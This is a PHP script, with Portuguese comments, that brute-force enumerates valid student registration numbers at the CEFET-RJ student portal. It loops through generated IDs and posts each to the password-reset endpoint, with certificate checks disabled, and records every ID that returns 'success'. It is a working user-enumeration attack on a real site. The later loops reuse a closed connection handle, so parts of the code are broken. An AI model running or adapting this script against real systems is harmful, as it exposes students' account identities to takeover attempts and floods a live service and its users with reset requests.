<?php

/*

CURSOS SUBSEQUENTE:
ADMN
EDN
ELTN
ELN
MECN
TELN
SEGN
*/
$matriculas = [];
$curso = "ADMN";

echo "Começando o Scrape para o curso: ".$curso;
set_time_limit(0); // this way

$url = 'https://alunos.cefet-rj.br/usuario/publico/usuario/solicitacaonovasenha.action';
for ($matricula = 1000; $matricula < 10000; $matricula ++){
    $valor = "usuario=211".$matricula.$curso;
    $ch = curl_init();
    //curl_setopt($ch, CURLOPT_VERBOSE, 1);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Content-Type: application/x-www-form-urlencoded",
        "Referer: https://alunos.cefet-rj.br/usuario/publico/usuario/recuperacaosenha.action?br.com.asten.si.geral.web.spring.interceptors.AplicacaoWebChangeInterceptor.aplicacaoWeb=1"
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $valor);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    $server_output = curl_exec($ch);
    curl_close($ch);
    //$info = curl_getinfo($ch);    
    $pos = strpos($server_output, "location");
    $loc = substr($server_output, $pos+10);
    $status = explode('=true',explode('?',$loc)[1])[0];
    if($status == "success"){
        echo (explode('=',$valor)[1] . " " . $status. PHP_EOL);
        $matriculas[] = explode('=',$valor)[1];
    }
    if($status == "errorUsuario"){
        //nao existe
    }
    //usleep(1);
}
for ($matricula = 1000; $matricula < 10000; $matricula ++){
    $valor = "usuario=212".$matricula.$curso;
    curl_setopt($ch, CURLOPT_POSTFIELDS, $valor);
    $server_output = curl_exec($ch);
    curl_close($ch);
    $pos = strpos($server_output, "location");
    $loc = substr($server_output, $pos+10);
    $status = explode('=true',explode('?',$loc)[1])[0];
    if($status == "success"){
        echo (explode('=',$valor)[1] . " " . $status. PHP_EOL);
        $matriculas[] = explode('=',$valor)[1];
    }
    if($status == "errorUsuario"){
    }
}

for ($matricula = 1000; $matricula < 10000; $matricula ++){
    $valor = "usuario=221".$matricula.$curso;
    curl_setopt($ch, CURLOPT_POSTFIELDS, $valor);
    $server_output = curl_exec($ch);
    curl_close($ch);
    $pos = strpos($server_output, "location");
    $loc = substr($server_output, $pos+10);
    $status = explode('=true',explode('?',$loc)[1])[0];
    if($status == "success"){
        echo (explode('=',$valor)[1] . " " . $status. PHP_EOL);
        $matriculas[] = explode('=',$valor)[1];
    }
    if($status == "errorUsuario"){
    }
}

for ($matricula = 1000; $matricula < 10000; $matricula ++){
    $valor = "usuario=222".$matricula.$curso;
    curl_setopt($ch, CURLOPT_POSTFIELDS, $valor);
    $server_output = curl_exec($ch);
    curl_close($ch);
    $pos = strpos($server_output, "location");
    $loc = substr($server_output, $pos+10);
    $status = explode('=true',explode('?',$loc)[1])[0];
    if($status == "success"){
        echo (explode('=',$valor)[1] . " " . $status. PHP_EOL);
        $matriculas[] = explode('=',$valor)[1];
    }
    if($status == "errorUsuario"){
    }
}

for ($matricula = 1000; $matricula < 10000; $matricula ++){
    $valor = "usuario=231".$matricula.$curso;
    curl_setopt($ch, CURLOPT_POSTFIELDS, $valor);
    $server_output = curl_exec($ch);
    curl_close($ch);
    $pos = strpos($server_output, "location");
    $loc = substr($server_output, $pos+10);
    $status = explode('=true',explode('?',$loc)[1])[0];
    if($status == "success"){
        echo (explode('=',$valor)[1] . " " . $status. PHP_EOL);
        $matriculas[] = explode('=',$valor)[1];
    }
    if($status == "errorUsuario"){
    }
} 

echo "EXISTENTES: ";
var_export($matriculas);
?>